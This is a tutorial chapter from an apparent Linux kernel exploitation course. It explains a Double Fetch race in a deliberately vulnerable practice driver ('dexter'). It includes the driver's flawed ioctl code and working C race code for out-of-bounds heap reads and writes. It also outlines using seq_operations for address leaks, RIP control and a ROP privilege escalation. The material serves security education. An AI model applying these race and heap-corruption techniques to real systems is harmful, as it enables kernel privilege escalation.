---
title: Double Fetch
tags:
    - [Linux]
    - [Kernel]
    - [Data Race]
    - [Double Fetch]
    - [seq_operations]
    - [Stack Pivot]
lang: en
permalink: /en/linux-kernel/LK03/double_fetch.html
pagination: true
bk: ../LK02/null_ptr_deref.html
fd: ../LK04/uffd.html
---
In LK03 (Dexter), we learn about a vulnerability called Double Fetch. First, download the files for [practice problem LK03](distfiles/LK03.tar.gz).

## QEMU boot options
In LK03, SMEP, KASLR, and KPTI are enabled, while SMAP is disabled. Also note that because the bug handled here is race-related, the environment runs on multiple cores.[^1]
SMAP is disabled only to make privilege escalation easier. The vulnerability itself is still triggerable even if SMAP is enabled.
```sh
#!/bin/sh
qemu-system-x86_64 \
    -m 64M \
    -nographic \
    -kernel bzImage \
    -append "console=ttyS0 loglevel=3 oops=panic panic=-1 pti=on kaslr" \
    -no-reboot \
    -cpu kvm64,+smep \
    -smp 2 \
    -monitor /dev/null \
    -initrd rootfs.cpio \
    -net nic,model=virtio \
    -net user
```

## Source-code analysis
Let's start by reading the LK03 source code. It is written in `src/dexter.c`.
This kernel module stores up to 0x20 bytes of data. It is controlled through `ioctl` and provides both read and write functionality.
```c
#define CMD_GET 0xdec50001
#define CMD_SET 0xdec50002
...
  switch (cmd) {
    case CMD_GET: return copy_data_to_user(filp, (void*)arg);
    case CMD_SET: return copy_data_from_user(filp, (void*)arg);
    default: return -EINVAL;
  }
```
When the device is opened, a 0x20-byte region is allocated with `kzalloc` and stored in `private_data`. That region is freed when the device is closed.
```c
static int module_open(struct inode *inode, struct file *filp) {
  filp->private_data = kzalloc(BUFFER_SIZE, GFP_KERNEL);
  if (!filp->private_data) return -ENOMEM;
  return 0;
}

static int module_close(struct inode *inode, struct file *filp) {
  kfree(filp->private_data);
  return 0;
}
```
When `ioctl` is called, the module first validates the user-supplied data in `verify_request`. There it checks that the user-provided pointer is non-NULL and that the size does not exceed 0x20.
```c
int verify_request(void *reqp) {
  request_t req;
  if (copy_from_user(&req, reqp, sizeof(request_t)))
    return -1;
  if (!req.ptr || req.len > BUFFER_SIZE)
    return -1;
  return 0;
}

...

  if (verify_request((void*)arg))
    return -EINVAL;
```
Then, in `CMD_GET` and `CMD_SET`, it copies data from `private_data` to user space or from user space into `private_data`.
```c
long copy_data_to_user(struct file *filp, void *reqp) {
  request_t req;
  if (copy_from_user(&req, reqp, sizeof(request_t)))
    return -EINVAL;
  if (copy_to_user(req.ptr, filp->private_data, req.len))
    return -EINVAL;
  return 0;
}

long copy_data_from_user(struct file *filp, void *reqp) {
  request_t req;
  if (copy_from_user(&req, reqp, sizeof(request_t)))
    return -EINVAL;
  if (copy_from_user(filp->private_data, req.ptr, req.len))
    return -EINVAL;
  return 0;
}
```
Since the size is checked in `verify_request` before data is copied from user space, it may look as though no heap buffer overflow is possible.

## Double Fetch
**Double Fetch** is the name given to one kind of data race in kernel space. As the name suggests, it is a race that occurs because the kernel fetches, that is, reads, the same data twice.
When the kernel reads the same user-space data twice as shown below, another thread may modify that data in between.

<center>
  <img src="img/double_fetch.png" alt="Double Fetch" style="width:720px;">
</center>

When that happens, the first fetch and the second fetch observe different contents, and consistency breaks down. This kind of data race is called Double Fetch. The major difference from the race bug we studied in [LK01](../LK01/race_condition.html) is that this bug cannot be fixed simply by taking a mutex on the kernel side.

In this driver, request data from user space is fetched both in `verify_request` and in `copy_data_to_user` or `copy_data_from_user`. In other words, if we pass a valid size during `verify_request` and then rewrite the size to an invalid value before `copy_data_to_user` or `copy_data_from_user` runs, we can trigger a heap buffer overflow.

<div class="balloon_l">
  <div class="faceicon"><img src="../img/wolf_suyasuya.png" alt="Wolf" ></div>
  <p class="says">
    So when kernel code needs to use user-space data more than once, it has to copy it into kernel space first and then keep using that copy.
  </p>
</div>

## Triggering the bug
First, let's use the driver in the intended way. The following code stores data into the driver:
```c
int set(char *buf, size_t len) {
  request_t req = { .ptr=buf, .len=len };
  return ioctl(fd, CMD_SET, &req);
}
int get(char *buf, size_t len) {
  request_t req = { .ptr=buf, .len=len };
  return ioctl(fd, CMD_GET, &req);
}

int main() {
  fd = open("/dev/dexter", O_RDWR);
  if (fd == -1) fatal("/dev/dexter");

  char buf[0x20];
  set("Hello, World!", 13);
  get(buf, 13);
  printf("%s\n", buf);

  close(fd);
  return 0;
}
```

Next, let's check the behavior of Double Fetch. We first write simple code just to confirm that the bug can actually be triggered. Here, we repeatedly attempt the race until data that was never written becomes readable.
```c
int fd;
request_t req;

int set(char *buf, size_t len) {
  req.ptr = buf;
  req.len = len;
  return ioctl(fd, CMD_SET, &req);
}
int get(char *buf, size_t len) {
  req.ptr = buf;
  req.len = len;
  return ioctl(fd, CMD_GET, &req);
}

int race_win = 0;

void *race(void *arg) {
  while (!race_win) {
    req.len = 0x100;
    usleep(1);
  }
  return NULL;
}

int main() {
  fd = open("/dev/dexter", O_RDWR);
  if (fd == -1) fatal("/dev/dexter");

  char buf[0x100] = {}, zero[0x100] = {};
  pthread_t th;
  pthread_create(&th, NULL, race, NULL);
  while (!race_win) {
    get(buf, 0x20);
    if (memcmp(buf, zero, 0x100) != 0) {
      race_win = 1;
      break;
    }
  }
  pthread_join(th, NULL);

  for (int i = 0; i < 0x100; i += 8) {
    printf("%02x: 0x%016lx\n", i, *(unsigned long*)&buf[i]);
  }

  close(fd);
  return 0;
}
```
The main thread calls `CMD_GET` with the correct size, while the worker thread overwrites the size field in user space with an invalid value. If the worker thread manages to rewrite the size after `verify_request` runs but before `copy_data_to_user` runs, data is copied with the invalid size and a heap buffer overflow occurs.

For `CMD_GET`, we can just check whether we managed to read beyond the buffer size. But how should we tell whether a buffer overflow succeeded through `CMD_SET`? There are several ways, but here we chose to try an out-of-bounds write a constant number of times and then confirm success afterward using an out-of-bounds read.
```c
void overread(char *buf, size_t len) {
  char *zero = (char*)malloc(len);
  pthread_t th;
  pthread_create(&th, NULL, race, (void*)len);

  memset(buf, 0, len);
  memset(zero, 0, len);
  while (!race_win) {
    get(buf, 0x20);
    if (memcmp(buf, zero, len) != 0) {
      race_win = 1;
      break;
    }
  }

  pthread_join(th, NULL);
  race_win = 0;
  free(zero);
}

void overwrite(char *buf, size_t len) {
  pthread_t th;
  char *tmp = (char*)malloc(len);

  while (1) {
    // Try the race a constant number of times
    pthread_create(&th, NULL, race, (void*)len);
    for (int i = 0; i < 0x10000; i++) set(buf, 0x20);
    race_win = 1;
    pthread_join(th, NULL);
    race_win = 0;
    // Retry if the heap overflow did not succeed
    overread(tmp, len);
    if (memcmp(tmp, buf, len) == 0) break;
  }

  free(tmp);
}
```
When the author tried a heap overflow this way, the object right behind it happened to contain important data on that system, so the kernel panicked as shown below.

<center>
  <img src="img/dexter_crash.png" alt="Crash caused by heap overflow" style="width:720px;">
</center>

## `seq_operations`
The region we can corrupt here is in `kmalloc-32`, so we need to find an object in the same size class that is useful for exploitation. In `kmalloc-32`, the [`seq_operations` structure](https://elixir.bootlin.com/linux/v5.17.1/source/include/linux/seq_file.h#L32) is convenient.
```c
struct seq_operations {
    void * (*start) (struct seq_file *m, loff_t *pos);
    void (*stop) (struct seq_file *m, void *v);
    void * (*next) (struct seq_file *m, void *v, loff_t *pos);
    int (*show) (struct seq_file *m, void *v);
};
```
`seq_operations` is a structure that stores handler functions used by the kernel when user space reads special files in sysfs, debugfs, procfs, and similar filesystems. So we can allocate one by opening a special file such as `/proc/self/stat`.
Because it contains function pointers, it can leak kernel addresses, and if we call `read`, for example, the `start` handler in `seq_operations` is invoked, which also lets us control RIP.

<div class="balloon_l">
  <div class="faceicon"><img src="../img/wolf_normal.png" alt="Wolf" ></div>
  <p class="says">
    There are many other useful structures allocated from kmalloc-32 as well.<br>
    Try looking at some of them in the exercise.
  </p>
</div>

## Privilege escalation
This time, SMAP is disabled, so we can pivot the stack into user space. Try writing your own ROP chain and escalate privileges.

<center>
  <img src="img/dexter_privesc.png" alt="Privilege escalation via Double Fetch" style="width:320px;">
</center>

[^1]: A method for causing races even on a single core will appear in a later chapter.

---

<div class="column" title="Exercise">
  Modify the exploit so that it still works even when SMAP is enabled.
</div>
